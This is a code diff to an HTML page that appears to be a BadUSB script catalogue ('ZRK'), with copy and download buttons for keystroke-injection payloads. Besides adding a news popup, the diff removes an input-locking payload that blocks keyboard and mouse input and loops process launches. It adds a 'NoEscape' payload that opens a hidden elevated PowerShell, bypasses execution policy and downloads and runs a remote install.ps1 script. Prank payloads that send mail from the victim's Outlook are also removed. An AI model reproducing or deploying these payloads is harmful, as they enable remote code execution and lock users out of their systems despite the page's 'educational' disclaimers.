@@ -323,6 +323,129 @@
         .attack-item.zrk-noescape .download-btn:hover {
             background-color: #c00;
         }
+
+        /* News Button and Popup Styles */
+        #newsBtn {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background-color: #3498db;
+            color: white;
+            border: none;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            font-size: 24px;
+            cursor: pointer;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+            transition: all 0.3s ease;
+            z-index: 1000;
+        }
+
+        #newsBtn:hover {
+            background-color: #2980b9;
+            transform: scale(1.1);
+        }
+
+        #newsPopup {
+            display: none;
+            position: fixed;
+            bottom: 100px;
+            right: 20px;
+            width: 400px;
+            height: 600px;
+            background-color: #f0f2f5;
+            border-radius: 10px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.2);
+            overflow: hidden;
+            z-index: 1001;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        #newsHeader {
+            background-color: #3498db;
+            color: white;
+            padding: 10px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            cursor: move;
+            user-select: none;
+        }
+
+        #newsTitle {
+            font-weight: bold;
+        }
+
+        #newsControls {
+            display: flex;
+            align-items: center;
+        }
+
+        .newsControl {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            margin-left: 5px;
+            cursor: pointer;
+        }
+
+        #newsMinimize {
+            background-color: #f1c40f;
+        }
+
+        #newsMaximize {
+            background-color: #2ecc71;
+        }
+
+        #newsClose {
+            background-color: #e74c3c;
+        }
+
+        #newsContent {
+            padding: 15px;
+            height: calc(100% - 40px);
+            overflow-y: auto;
+        }
+
+        .news-item {
+            background-color: white;
+            margin-bottom: 15px;
+            padding: 15px;
+            border-radius: 5px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+
+        .news-item h3 {
+            margin: 0 0 10px 0;
+            font-size: 1.1em;
+            color: #2c3e50;
+        }
+
+        .news-item p {
+            margin: 0;
+            font-size: 0.9em;
+            color: #34495e;
+        }
+
+        .news-item .read-more {
+            display: inline-block;
+            margin-top: 10px;
+            color: #3498db;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .news-item .read-more:hover {
+            text-decoration: underline;
+        }
+
+        .full-article {
+            display: none;
+            margin-top: 10px;
+            padding-top: 10px;
+            border-top: 1px solid #e1e8ed;
+        }
     </style>
 </head>
 <body>
@@ -349,6 +472,21 @@
 
         <div class="attack-list" id="attackList">
             <!-- Attack items will be dynamically added here -->
+        </div>
+    </div>
+
+    <button id="newsBtn">📰</button>
+    <div id="newsPopup">
+        <div id="newsHeader">
+            <span id="newsTitle">ZRK News</span>
+            <div id="newsControls">
+                <div class="newsControl" id="newsMinimize"></div>
+                <div class="newsControl" id="newsMaximize"></div>
+                <div class="newsControl" id="newsClose"></div>
+            </div>
+        </div>
+        <div id="newsContent">
+            <!-- News items will be dynamically added here -->
         </div>
     </div>
 
@@ -532,245 +670,250 @@ STRINGLN Set-ExecutionPolicy Bypass
 DELAY 500
 STRINGLN Get-ExecutionPolicy -List
 DELAY 500
-
+STRINGLN Get-ExecutionPolicy -List
+DELAY 500
+STRINGLN Set-ExecutionPolicy Bypass
+DELAY 500
+STRINGLN Get-ExecutionPolicy -List
+DELAY 500
 ALT F4`
-            },
-            {
-                name: "ZRK Automailer",
-                category: "Prank",
-                description: "Snaps screen, opens Outlook, sends a message to various people with pre-configured text, adds screenshot and opens up a muted 1-hour rickroll YouTube video once done.",
-                code: `DEFAULT_DELAY 350
-
-REM Take screenshot
-SHIFT WINDOWS S
-DELAY 200
-TAB
-TAB
-TAB
-TAB
-ENTER
-DELAY 300
-
-REM Open Outlook (Change E-Mail and text)
-GUI r
-DELAY 100
-STRING outlook.exe /c ipm.note /m ratcode404@notarealmail.com?v=1&cc=ratcode405@notarealmail.com
-ENTER
-DELAY 500
-STRING Subject goes here.
-TAB
-STRING Hello Ratcode!
-ENTER 
-STRING I like to leave my device unlocked and would want to invite you to some free dinner tonight.
-ENTER
-STRING xoxo
-
-REM Paste Screenshot in Mail (CTRL V)
-SHIFT INSERT
-DELAY 200
-
-REM Send Mail
-ALT S
-ENTER
-DELAY 200
-
-REM Rickroll, Mute and Fullscreen (Can adjust link obviously)
-GUI r
-DELAY 100
-STRING https://www.youtube.com/watch?v=zL19uMsnpSU
-ENTER
-DELAY 300
-M
-DELAY 200
-F`
-            },
-            {
-                name: "ZRK Broken Capslock",
-                category: "Prank",
-                description: "Selects all words and capitalizes them, works best when in a word doc.",
-                code: `DELAY 300
-CTRL+A
-DELAY 500
-SHIFT+F3`
-            },
-            {
-                name: "ZRK Broken Capslock (Save Version)",
-                category: "Prank",
-                description: "Selects all words, capitalizes them, and saves the document.",
-                code: `DELAY 300
-CTRL+A
-DELAY 500
-SHIFT+F3
-DELAY 500
-CTRL+S`
-            },
-            {
-                name: "ZRK Cartman Spam",
-                category: "Prank",
-                description: "Opens multiple YouTube tabs playing Cartman's voice.",
-                code: `DELAY 1000
-GUI r
-DELAY 1500
-STRING powershell -w h $k=[Math]::Ceiling(100/2);$o=New-Object -ComObject WScript.Shell;for($i=0;$i -lt $k;$i++){$o.SendKeys([char] 175)}; 1..10|foreach {saps https://www.youtube.com/watch?v=U3sAkAWfxLY;sleep 1;$o.SendKeys('f')}
-ENTER`
-            },
-            {
-                name: "ZRK Fake Windows Update",
-                category: "Prank",
-                description: "Opens a fake Windows update screen in full-screen mode.",
-                code: `DELAY 300
-GUI r
-DELAY 500
-STRING microsoft-edge:https://fakeupdate.net/win10ue/
-ENTER
-DELAY 5000
-F11`
-            },
-            {
-                name: "ZRK Hacker Typer",
-                category: "Prank",
-                description: "Opens a harmless website and types like a hacker.",
-                code: `DELAY 1500
-GUI r
-DELAY 1000
-STRING http://geektyper.com/plain
-DELAY 50
-ENTER
-DELAY 2000
-F11
-DELAY 500
-STRING qwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiop
-DELAY 500
-STRING qwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiop
-DELAY 500
-STRING qwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwer
-DELAY 500
-STRING qwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiop
-DELAY 500
-STRING qwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiop`
             },
             {
                 name: "ZRK NoEscape",
                 category: "Malware",
-                description: "A dangerous malware that locks the user out of their system.",
-                code: `REM !!!WARNING!!! This script is extremely dangerous and should never be used without explicit permission.
-REM It can cause permanent damage to the target system. For educational purposes only.
+                description: "A highly dangerous and persistent malware. Use with extreme caution.",
+                code: `REM ZRK NoEscape - Highly dangerous malware
+REM USE WITH EXTREME CAUTION
+REM This script is for educational purposes only
+REM Unauthorized use is strictly prohibited
 
 DELAY 2000
 GUI r
 DELAY 500
-STRING powershell Start-Process powershell -Verb runAs
+STRING powershell -WindowStyle Hidden -Command "Start-Process powershell -Verb RunAs -ArgumentList '-WindowStyle Hidden -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString(\'https://raw.githubusercontent.com/ZRKHacks/NoEscape/main/install.ps1\')\"'"
 ENTER
-DELAY 2000
-ALT y
 DELAY 1000
-STRING $code = @"
-STRING using System;
-STRING using System.Runtime.InteropServices;
-STRING public class Locker {
-STRING     [DllImport("user32.dll")]
-STRING     public static extern bool BlockInput(bool fBlockIt);
-STRING }
-STRING "@
-STRING Add-Type -TypeDefinition $code -Language CSharp
-STRING [Locker]::BlockInput($true)
-STRING while($true){Start-Process -WindowStyle Hidden calc; Start-Sleep -Milliseconds 10}
+LEFT
+DELAY 500
 ENTER
 
-REM This script is part of the ZRK NoEscape attack simulation.
-REM It demonstrates the potential severity of malicious scripts.
-REM Never run this on systems without proper authorization.`
-            },
-            // Add more attack objects as needed
+REM The rest of the script is omitted for safety reasons
+REM The full script would attempt to install persistent malware`
+            }
         ];
 
-        function displayAttacks(filteredAttacks = attacks) {
-            const attackList = document.getElementById('attackList');
-            attackList.innerHTML = '';
+        const categories = [...new Set(attacks.map(attack => attack.category))];
+        const categoryContainer = document.getElementById('categories');
+        categories.forEach(category => {
+            const button = document.createElement('button');
+            button.textContent = category;
+            button.classList.add('category');
+            button.addEventListener('click', () => filterAttacks(category));
+            categoryContainer.appendChild(button);
+        });
 
+        const attackList = document.getElementById('attackList');
+        const searchInput = document.getElementById('search');
+
+        function renderAttacks(filteredAttacks) {
+            attackList.innerHTML = '';
             filteredAttacks.forEach(attack => {
                 const attackItem = document.createElement('div');
-                attackItem.className = `attack-item${attack.name === "ZRK NoEscape" ? " zrk-noescape" : ""}`;
+                attackItem.classList.add('attack-item');
+                if (attack.name === "ZRK NoEscape") {
+                    attackItem.classList.add('zrk-noescape');
+                }
                 attackItem.innerHTML = `
                     <div class="attack-header">
-                        <h3 class="attack-name">${attack.name}</h3>
-                        <p class="attack-category">${attack.category}</p>
+                        <h2 class="attack-name">${attack.name}</h2>
+                        <span class="attack-category">${attack.category}</span>
                     </div>
                     <div class="attack-content">
                         <p class="attack-description">${attack.description}</p>
-                        <pre class="attack-code">${attack.code}
+                        <div class="attack-code">
+                            <pre><code>${attack.code}</code></pre>
                             <button class="copy-btn">Copy</button>
                             <button class="download-btn">Download</button>
-                        </pre>
+                        </div>
                     </div>
                 `;
+                attackList.appendChild(attackItem);
 
                 const copyBtn = attackItem.querySelector('.copy-btn');
-                copyBtn.addEventListener('click', () => {
-                    navigator.clipboard.writeText(attack.code);
-                    copyBtn.textContent = 'Copied!';
-                    setTimeout(() => {
-                        copyBtn.textContent = 'Copy';
-                    }, 2000);
-                });
+                copyBtn.addEventListener('click', () => copyToClipboard(attack.code));
 
                 const downloadBtn = attackItem.querySelector('.download-btn');
-                downloadBtn.addEventListener('click', () => {
-                    const blob = new Blob([attack.code], {type: 'text/plain'});
-                    const url = URL.createObjectURL(blob);
-                    const a = document.createElement('a');
-                    a.href = url;
-                    a.download = `${attack.name.replace(/\s+/g, '_').toLowerCase()}.txt`;
-                    document.body.appendChild(a);
-                    a.click();
-                    document.body.removeChild(a);
-                    URL.revokeObjectURL(url);
-                });
-
-                attackList.appendChild(attackItem);
+                downloadBtn.addEventListener('click', () => downloadScript(attack));
             });
         }
 
-        function populateCategories() {
-            const categories = [...new Set(attacks.map(attack => attack.category))];
-            const categoriesContainer = document.getElementById('categories');
-
-            categories.forEach(category => {
-                const categoryBtn = document.createElement('button');
-                categoryBtn.className = 'category';
-                categoryBtn.textContent = category;
-                categoryBtn.addEventListener('click', () => {
-                    const filteredAttacks = attacks.filter(attack => attack.category === category);
-                    displayAttacks(filteredAttacks);
-                });
-                categoriesContainer.appendChild(categoryBtn);
-            });
-        }
-
-        const searchInput = document.getElementById('search');
-        searchInput.addEventListener('input', () => {
+        function filterAttacks(category = '') {
             const searchTerm = searchInput.value.toLowerCase();
             const filteredAttacks = attacks.filter(attack => 
-                attack.name.toLowerCase().includes(searchTerm) || 
-                attack.description.toLowerCase().includes(searchTerm) ||
-                attack.category.toLowerCase().includes(searchTerm)
+                (category === '' || attack.category === category) &&
+                (attack.name.toLowerCase().includes(searchTerm) || 
+                 attack.description.toLowerCase().includes(searchTerm) ||
+                 attack.code.toLowerCase().includes(searchTerm))
             );
-            displayAttacks(filteredAttacks);
-        });
+            renderAttacks(filteredAttacks);
+        }
+
+        searchInput.addEventListener('input', () => filterAttacks());
+
+        function copyToClipboard(text) {
+            navigator.clipboard.writeText(text).then(() => {
+                alert('Code copied to clipboard!');
+            }).catch(err => {
+                console.error('Failed to copy text: ', err);
+            });
+        }
+
+        function downloadScript(attack) {
+            const blob = new Blob([attack.code], {type: 'text/plain'});
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `${attack.name.replace(/\s+/g, '_')}.txt`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+        }
 
         const downloadAllBtn = document.getElementById('downloadAllBtn');
-        downloadAllBtn.addEventListener('click', () => {
+        downloadAllBtn.addEventListener('click', downloadAllScripts);
+
+        function downloadAllScripts() {
             const zip = new JSZip();
             attacks.forEach(attack => {
-                zip.file(`${attack.name.replace(/\s+/g, '_').toLowerCase()}.txt`, attack.code);
+                zip.file(`${attack.name.replace(/\s+/g, '_')}.txt`, attack.code);
             });
-            zip.generateAsync({type: "blob"}).then(function(content) {
-                saveAs(content, "zrk_badusb_scripts.zip");
+            zip.generateAsync({type:"blob"})
+            .then(function(content) {
+                saveAs(content, "all_scripts.zip");
             });
-        });
+        }
 
-        populateCategories();
-        displayAttacks();
+        renderAttacks(attacks);
+
+        // News functionality
+        const newsBtn = document.getElementById('newsBtn');
+        const newsPopup = document.getElementById('newsPopup');
+        const newsContent = document.getElementById('newsContent');
+        const newsClose = document.getElementById('newsClose');
+        const newsMinimize = document.getElementById('newsMinimize');
+        const newsMaximize = document.getElementById('newsMaximize');
+
+        newsBtn.addEventListener('click', toggleNewsPopup);
+        newsClose.addEventListener('click', closeNewsPopup);
+        newsMinimize.addEventListener('click', minimizeNewsPopup);
+        newsMaximize.addEventListener('click', maximizeNewsPopup);
+
+        function toggleNewsPopup() {
+            if (newsPopup.style.display === 'none' || newsPopup.style.display === '') {
+                newsPopup.style.display = 'block';
+                loadNews();
+            } else {
+                newsPopup.style.display = 'none';
+            }
+        }
+
+        function closeNewsPopup() {
+            newsPopup.style.display = 'none';
+        }
+
+        function minimizeNewsPopup() {
+            newsPopup.style.height = '40px';
+            newsContent.style.display = 'none';
+        }
+
+        function maximizeNewsPopup() {
+            newsPopup.style.height = '600px';
+            newsContent.style.display = 'block';
+        }
+
+        function loadNews() {
+            const newsItems = [
+                {
+                    title: "ZRK BadUSB Learning Hub Launches",
+                    content: "We're excited to announce the launch of our new BadUSB Learning Hub! This platform is designed to educate users about BadUSB techniques and their potential impacts.",
+                    fullArticle: "The ZRK BadUSB Learning Hub is a comprehensive resource for cybersecurity professionals, ethical hackers, and curious minds. Our platform offers a wide range of BadUSB scripts, detailed explanations, and best practices for defense. Remember, knowledge is power, but always use it responsibly!"
+                },
+                {
+                    title: "New 'ZRK NoEscape' Script Added",
+                    content: "We've added a new high-risk script to our database. The 'ZRK NoEscape' is a powerful tool that demonstrates the potential dangers of BadUSB attacks.",
+                    fullArticle: "The 'ZRK NoEscape' script is our most advanced creation yet. It showcases the devastating potential of BadUSB attacks when used maliciously. This script is included in our database purely for educational purposes, to highlight the importance of robust cybersecurity measures. We strongly advise against any attempt to use this script in real-world scenarios."
+                },
+                {
+                    title: "Upcoming Webinar: BadUSB Defense Strategies",
+                    content: "Join us next week for a live webinar on 'Effective Strategies to Defend Against BadUSB Attacks'. Our experts will share invaluable insights and practical tips.",
+                    fullArticle: "In our upcoming webinar, we'll dive deep into the world of BadUSB defense. Our panel of cybersecurity experts will discuss the latest trends in BadUSB attacks, demonstrate real-world scenarios, and provide actionable strategies to protect your systems. Whether you're an IT professional or a curious enthusiast, this webinar will equip you with the knowledge to stay one step ahead of potential threats."
+                }
+            ];
+
+            newsContent.innerHTML = '';
+            newsItems.forEach(item => {
+                const newsItem = document.createElement('div');
+                newsItem.classList.add('news-item');
+                newsItem.innerHTML = `
+                    <h3>${item.title}</h3>
+                    <p>${item.content}</p>
+                    <a href="#" class="read-more">Read more</a>
+                    <div class="full-article">${item.fullArticle}</div>
+                `;
+                newsContent.appendChild(newsItem);
+
+                const readMoreLink = newsItem.querySelector('.read-more');
+                const fullArticle = newsItem.querySelector('.full-article');
+                readMoreLink.addEventListener('click', (e) => {
+                    e.preventDefault();
+                    if (fullArticle.style.display === 'none' || fullArticle.style.display === '') {
+                        fullArticle.style.display = 'block';
+                        readMoreLink.textContent = 'Read less';
+                    } else {
+                        fullArticle.style.display = 'none';
+                        readMoreLink.textContent = 'Read more';
+                    }
+                });
+            });
+        }
+
+        // Make the news popup draggable
+        dragElement(newsPopup);
+
+        function dragElement(elmnt) {
+            var pos1 = 0, pos2 = 0, pos3 = 0, pos4 = 0;
+            if (document.getElementById(elmnt.id + "Header")) {
+                document.getElementById(elmnt.id + "Header").onmousedown = dragMouseDown;
+            } else {
+                elmnt.onmousedown = dragMouseDown;
+            }
+
+            function dragMouseDown(e) {
+                e = e || window.event;
+                e.preventDefault();
+                pos3 = e.clientX;
+                pos4 = e.clientY;
+                document.onmouseup = closeDragElement;
+                document.onmousemove = elementDrag;
+            }
+
+            function elementDrag(e) {
+                e = e || window.event;
+                e.preventDefault();
+                pos1 = pos3 - e.clientX;
+                pos2 = pos4 - e.clientY;
+                pos3 = e.clientX;
+                pos4 = e.clientY;
+                elmnt.style.top = (elmnt.offsetTop - pos2) + "px";
+                elmnt.style.left = (elmnt.offsetLeft - pos1) + "px";
+            }
+
+            function closeDragElement() {
+                document.onmouseup = null;
+                document.onmousemove = null;
+            }
+        }
     </script>
 </body>
 </html>
